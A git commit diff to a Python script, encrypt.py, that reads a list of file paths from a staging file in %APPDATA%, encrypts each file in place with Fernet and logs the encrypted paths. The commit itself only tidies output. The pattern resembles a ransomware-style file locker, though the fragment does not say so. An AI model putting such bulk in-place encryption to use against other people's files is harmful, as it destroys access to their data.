ccc3e034ecbf04b0c22cc7210148c4d887b36806
Py-Us3r <pyus3r@gmail.com>
2025-04-28 12:08:16 +0200

    Update encrypt.py

--- Uploads/encrypt.py
+++ Uploads/encrypt.py
@@ -17,15 +17,16 @@ fernet = Fernet(clave)
 
 temp_dir = os.path.expandvars(r"%APPDATA%")
 file_path=os.path.join(temp_dir, "allfiles.txt")
+
 if sys.argv[1] == file_path:
     with open(file_path, 'r') as f:
       archivos = f.read().strip().split(',')
-      print(archivos)
+
 else:
     archivos = sys.argv[1].strip().split(",")
 
 for archivo in archivos:
-    if os.path.exists(archivo):  
+    if os.path.exists(archivo) and archivo != file_path:  
         with open(archivo, "rb") as file:
             datos = file.read() 
 
@@ -35,8 +36,6 @@ for archivo in archivos:
              file.write(datos_encriptados)
         except:
           pass
-
-        print(f"Files has been successfully encrypted.")
         
         ruta_lista = os.path.join(temp_dir, "encrypted_files.txt")
 
@@ -45,3 +44,4 @@ for archivo in archivos:
     else:
         print(f"File ‘{archivo}’ does not exist.")
 
+print(f"Files has been successfully encrypted.")
